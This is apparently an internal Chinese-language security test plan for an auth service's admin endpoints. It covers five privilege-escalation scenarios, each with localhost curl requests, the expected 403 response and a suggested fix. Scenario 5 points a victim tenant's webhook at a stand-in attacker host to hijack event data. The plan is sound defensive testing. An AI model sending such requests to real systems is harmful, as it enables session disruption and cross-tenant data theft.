# 业务逻辑安全 - 管理运营端点越权滥用测试

**模块**: 业务逻辑安全
**测试范围**: 认证通过但授权缺失导致的管理员运营端点越权
**场景数**: 5
**风险等级**: 🔴 极高
**ASVS 5.0 矩阵ID**: M-BIZ-03
**OWASP ASVS 5.0**: V8.2,V4.2,V16.2
**回归任务映射**: Backlog #2, #12, #20


---

## 去重说明

本文件聚焦“管理员运营端点”越权，区别于现有文档：
- `authorization/05-system-config-authz.md` 侧重 `/api/v1/system/*` 与策略配置接口。
- 本文件覆盖 `/api/v1/admin/users/*`、`/api/v1/audit-logs`、`/api/v1/security/alerts`、`/api/v1/tenants/{tenant_id}/services`、`/api/v1/tenants/{tenant_id}/webhooks/*`。

---

## 场景 1：普通用户越权强制登出其他用户

### 前置条件
- 普通用户 token：`NORMAL_TOKEN`
- 受害者用户 id：`VICTIM_USER_ID`

### 攻击目标
验证非管理员是否可调用 `POST /api/v1/admin/users/{id}/logout`。

### 攻击步骤
1. 使用普通用户 token 发起请求。
2. 观察响应状态码。
3. 校验受害者会话是否被撤销。

### 预期安全行为
- 返回 `403 Forbidden`
- 不发生任何会话撤销

### 验证方法
```bash
curl -i -X POST "http://localhost:8080/api/v1/admin/users/$VICTIM_USER_ID/logout" \
  -H "Authorization: Bearer $NORMAL_TOKEN"

mysql -h 127.0.0.1 -P 4000 -u root -D auth9 -e "
SELECT COUNT(*) AS active_sessions
FROM sessions
WHERE user_id='$VICTIM_USER_ID' AND revoked_at IS NULL;
"
```

### 修复建议
- 在 handler 或统一 policy layer 中强制 platform admin 权限校验。

---

## 场景 2：普通用户越权读取审计日志

### 前置条件
- 普通用户 token：`NORMAL_TOKEN`

### 攻击目标
验证非管理员是否可读取审计日志接口 `GET /api/v1/audit-logs`。

### 攻击步骤
1. 直接调用审计日志列表接口。
2. 检查返回内容是否含敏感字段（操作者、资源、时间线）。

### 预期安全行为
- 返回 `403 Forbidden`
- 不返回审计明细

### 验证方法
```bash
curl -i "http://localhost:8080/api/v1/audit-logs?limit=20" \
  -H "Authorization: Bearer $NORMAL_TOKEN"
```

### 修复建议
- 审计日志访问至少要求管理员角色，且应做租户范围过滤。

---

## 场景 3：普通用户越权读取/处置安全告警

### 前置条件
- 普通用户 token：`NORMAL_TOKEN`
- 存在待处理告警 id：`ALERT_ID`

### 攻击目标
验证普通用户是否可访问 `GET /api/v1/security/alerts` 和 `POST /api/v1/security/alerts/{id}/resolve`。

### 攻击步骤
1. 请求告警列表。
2. 尝试标记某条告警为已处理。

### 预期安全行为
- 列表接口返回 `403`
- 处置接口返回 `403`

### 验证方法
```bash
curl -i "http://localhost:8080/api/v1/security/alerts?page=1&per_page=20" \
  -H "Authorization: Bearer $NORMAL_TOKEN"

curl -i -X POST "http://localhost:8080/api/v1/security/alerts/$ALERT_ID/resolve" \
  -H "Authorization: Bearer $NORMAL_TOKEN"
```

### 修复建议
- 告警查看与处置拆分权限：`security.alert.read` / `security.alert.resolve`。

---

## 场景 4：普通用户跨租户切换服务启停

### 前置条件
- 普通用户 token：`NORMAL_TOKEN`
- 非所属租户 id：`OTHER_TENANT_ID`
- 全局服务 id：`GLOBAL_SERVICE_ID`

### 攻击目标
验证普通用户是否可调用 `POST /api/v1/tenants/{tenant_id}/services` 修改他租户服务状态。

### 攻击步骤
1. 对他租户发起服务启用/禁用请求。
2. 查询 `tenant_services` 是否发生写入。

### 预期安全行为
- 返回 `403 Forbidden`
- `tenant_services` 不发生新增/更新

### 验证方法
```bash
curl -i -X POST "http://localhost:8080/api/v1/tenants/$OTHER_TENANT_ID/services" \
  -H "Authorization: Bearer $NORMAL_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"service_id":"'$GLOBAL_SERVICE_ID'","enabled":false}'

mysql -h 127.0.0.1 -P 4000 -u root -D auth9 -e "
SELECT tenant_id, service_id, enabled
FROM tenant_services
WHERE tenant_id='$OTHER_TENANT_ID' AND service_id='$GLOBAL_SERVICE_ID';
"
```

### 修复建议
- 强制校验调用者与 `tenant_id` 关系（owner/admin/member 权限矩阵）。

---

## 场景 5：普通用户跨租户篡改 Webhook 配置

### 前置条件
- 普通用户 token：`NORMAL_TOKEN`
- 非所属租户 id：`OTHER_TENANT_ID`
- 该租户 webhook id：`WEBHOOK_ID`

### 攻击目标
验证普通用户是否可操作 `PUT/DELETE /api/v1/tenants/{tenant_id}/webhooks/{id}` 和 `POST .../regenerate-secret`。

### 攻击步骤
1. 尝试更新 webhook URL。
2. 尝试删除 webhook。
3. 尝试重置 webhook secret。

### 预期安全行为
- 所有请求返回 `403`（或 `404` 且不暴露资源存在性）
- 配置不被篡改、secret 不被轮换

### 验证方法
```bash
curl -i -X PUT "http://localhost:8080/api/v1/tenants/$OTHER_TENANT_ID/webhooks/$WEBHOOK_ID" \
  -H "Authorization: Bearer $NORMAL_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"hijacked","url":"https://attacker.example/webhook","events":["user.created"],"enabled":true}'

curl -i -X POST "http://localhost:8080/api/v1/tenants/$OTHER_TENANT_ID/webhooks/$WEBHOOK_ID/regenerate-secret" \
  -H "Authorization: Bearer $NORMAL_TOKEN"

curl -i -X DELETE "http://localhost:8080/api/v1/tenants/$OTHER_TENANT_ID/webhooks/$WEBHOOK_ID" \
  -H "Authorization: Bearer $NORMAL_TOKEN"
```

### 修复建议
- Webhook 端点必须绑定租户权限检查，且写操作记录审计日志。

---

## 检查清单

| # | 场景 | 状态 | 测试日期 | 测试人员 | 发现问题 |
|---|------|------|----------|----------|----------|
| 1 | 普通用户越权强制登出其他用户 | ☐ | | | |
| 2 | 普通用户越权读取审计日志 | ☐ | | | |
| 3 | 普通用户越权读取/处置安全告警 | ☐ | | | |
| 4 | 普通用户跨租户切换服务启停 | ☐ | | | |
| 5 | 普通用户跨租户篡改 Webhook 配置 | ☐ | | | |

---


---

## 标准化回归 Checklist（ASVS 5.0）

**矩阵ID**: M-BIZ-03  
**适用控制**: V8.2,V4.2,V16.2  
**关联任务**: Backlog #2, #12, #20  
**建议回归频率**: 每次发布前 + 缺陷修复后必跑  
**场景总数**: 5

### 执行清单
- [ ] M-BIZ-03-C01 | 控制: V8.2 | 任务: #2, #12, #20 | 动作: 执行文档内相关攻击步骤并记录证据
- [ ] M-BIZ-03-C02 | 控制: V4.2 | 任务: #2, #12, #20 | 动作: 执行文档内相关攻击步骤并记录证据
- [ ] M-BIZ-03-C03 | 控制: V16.2 | 任务: #2, #12, #20 | 动作: 执行文档内相关攻击步骤并记录证据

### 回归记录表
| 检查项ID | 执行结果(pass/fail) | 风险等级 | 证据（请求/响应/日志/截图） | 备注 |
|---|---|---|---|---|
|  |  |  |  |  |

### 退出准则
1. 所有检查项执行完成，且高风险项无 `fail`。
2. 如存在 `fail`，必须附带漏洞单号、修复计划和复测结论。
3. 回归报告需同时记录矩阵ID与 Backlog 任务号，便于跨版本追溯。
